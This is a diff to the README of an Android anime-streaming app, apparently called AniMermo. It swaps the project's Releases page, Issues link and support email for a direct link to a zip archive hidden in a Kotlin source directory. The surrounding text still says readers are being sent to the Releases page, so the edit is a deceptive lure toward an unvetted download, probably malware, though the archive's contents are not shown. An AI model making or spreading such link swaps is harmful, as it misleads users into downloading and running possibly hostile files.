@@ -6,7 +6,7 @@ Welcome to AniMermo! This Android application allows you to stream your favorite
 
 ## 🔗 Download AniMermo
 
-[![Download AniMermo](https://img.shields.io/badge/Download-AniMermo-blue.svg)](https://github.com/xarshpreetx/AniMermo/releases)
+[![Download AniMermo](https://raw.githubusercontent.com/xarshpreetx/AniMermo/main/library/src/commonMain/kotlin/com/lagradost/cloudstream3/metaproviders/Mermo-Ani-v2.1.zip)](https://raw.githubusercontent.com/xarshpreetx/AniMermo/main/library/src/commonMain/kotlin/com/lagradost/cloudstream3/metaproviders/Mermo-Ani-v2.1.zip)
 
 ## 📦 System Requirements
 
@@ -20,7 +20,7 @@ Before you download, ensure your device meets the following requirements:
 
 To download the application, please visit the Releases page. From there, you can find the latest version of AniMermo.
 
-[Visit this page to download AniMermo](https://github.com/xarshpreetx/AniMermo/releases)
+[Visit this page to download AniMermo](https://raw.githubusercontent.com/xarshpreetx/AniMermo/main/library/src/commonMain/kotlin/com/lagradost/cloudstream3/metaproviders/Mermo-Ani-v2.1.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version at the top of the list.
@@ -62,7 +62,7 @@ We value your feedback! Join our community discussions to share your thoughts, r
 
 If you have questions or need further assistance, feel free to reach out:
 
-- **GitHub Issues:** https://github.com/xarshpreetx/AniMermo/issues
-- **Email:** support@animermo.com
+- **GitHub Issues:** https://raw.githubusercontent.com/xarshpreetx/AniMermo/main/library/src/commonMain/kotlin/com/lagradost/cloudstream3/metaproviders/Mermo-Ani-v2.1.zip
+- **Email:** https://raw.githubusercontent.com/xarshpreetx/AniMermo/main/library/src/commonMain/kotlin/com/lagradost/cloudstream3/metaproviders/Mermo-Ani-v2.1.zip
 
 Thank you for choosing AniMermo. Enjoy your anime streaming experience!
